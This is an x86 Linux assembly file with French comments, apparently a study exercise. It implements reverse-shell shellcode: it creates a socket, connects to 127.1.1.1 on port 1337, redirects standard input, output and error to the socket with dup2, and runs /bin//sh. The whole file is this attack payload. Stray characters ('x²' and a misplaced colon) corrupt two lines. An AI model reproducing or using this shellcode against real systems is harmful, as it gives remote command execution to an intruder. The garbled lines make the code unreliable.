global _start			

section .text
_start:


	    	  ;
		  ; Création du socket
		  ;

		  ; Utilisation de la commande socket(2,1,0)


		
	push 0x66 ; Création de 102 en hexadécimal sur la stack car la fonction d'appel du socket est 102
	pop eax   ; Récupération de la dernière valeur de la stack, eax = 0x66

	push 0x1  ; Création de 1 sur la stack car on en aura besoin en tant qu'argument après
	pop ebx   ; Récupération de la dernière valeur de la stack, ebx = 0x1

	xor edx,edx   ; Mise en place de la valeur d'edx, edx = 0

	push edx  ; Mettre edx sur la stack, on a besoin de l'argument 0 en troisième position dans la stack (0 = Laisser le fournisseur d'accès pour donner le procotole qui sera TCP)
	push ebx  ; Mettre ebx sur la stack, on a besoin de l'argument 1 en second dans la stack (Connexion TCP)
	push 0x2  ; Mettre 0x2 sur le stack, on a besoin de l'argument 2 en première position (IPv4)
		
	mov ecx, esp  ; ? Pointe ecx en haut de la stack ? 
	int 0x80  ; Execution de la commande socket

	xchg edx, eax ; Sauvegarde du fichier pour s'en servir plus tard



		  ;
		  ; Connexion à l'adresse IP et au port de la machine
		  ;

		  ; Utilisation de la commande sockaddr_in(2,1337 ,127.1.1.1)
		  ; Utilisation de la commande connect(sockfd ,sockaddr_in ,16) pour se connecter à distance
		  ; sockfd      -> Fichier où est la configuration du socket
		  ; sockaddr_in -> Répertorie les inforations nécessaire afin de se connecter à distance au poste voulu


	mov al, 0x66 ; On remet la valeur 102 en hexadécimal à eax, eax = 102

	push 0x0101017f  ; L'adresse IP cible (127.1.1.1), troisième argument de la commande sockaddr_in
	push word 0x3905 ; Le port cible (1337), deuxième argument de la commande sockaddr_in
	inc ebx          ; Augmente le répertoire de ebx de 1, ebx = 1 + 1 = 2
	push word bx     ; Mettre sur la stack l'argument 0x2, premier argument de la commande sockaddr_in
	mov ecx, esp     ; ?

	push 0x10 ; Argument 3 de la commande connect(), taille de l'adresse 
	push ecx  ; Argument 2 de la commabde connect(), pointe vers le ?fichier? sockaddr
	push edx  ; Argument 1 de la commande connect(), le fichier sockfd

	mov ecx, esp ; ?

x²	inc ebx ; Augmente le répertoire de ebx de 1, ebx = 2 + 1 = 3 (3 est l'appel système de la commande connect())
	int 0x80 ; Execution de la commande connect()

	;
	; Redirection du stdin, stdout et stderr avec dup2
	;

	; int dup2(int oldfd, int newfd);



	:Utilisation de la commande dup2()
	push 0x2 ; Mettre le chiffre 2 en haut de la stack
	pop ecx  ; Création du compteur pour la boucle

	xchg ebx,edx ; Sauvegarde du fichier de socket 

	; Boucle trois fois pour appeler stdin(0), stdout(1) et stderr(2)
loop:
	mov al, 0x3f ; Appel système de la commande dup2()
	int 0x80     ; Execution de la commande dup2()
	dec ecx	     ; Décrémentation de la boucle jusqu'à 0
	jns loop     ; Tant que SF n'est pas mis lire la boucle


	; Utilisation de la commande execve(chemin,0,0)
	mov al, 0x0b ; Appel système de la commande execve()

	inc ecx      ; Argument argv à 0
	mov edx,ecx  ; Argument envp à 0

	push edx        ; Mettre 0 en haut de la stack pour terminé le chemin en NULL
	push 0x68732f2f	; Mettre "hs//" en haut de la stack qui est une partie du chemin
	push 0x6e69622f	; Mettre "nib/" en haut de la stack qui est une partie du chemin

	mov ebx, esp ; ?
	int 0x80 ; Execution de la commande execve



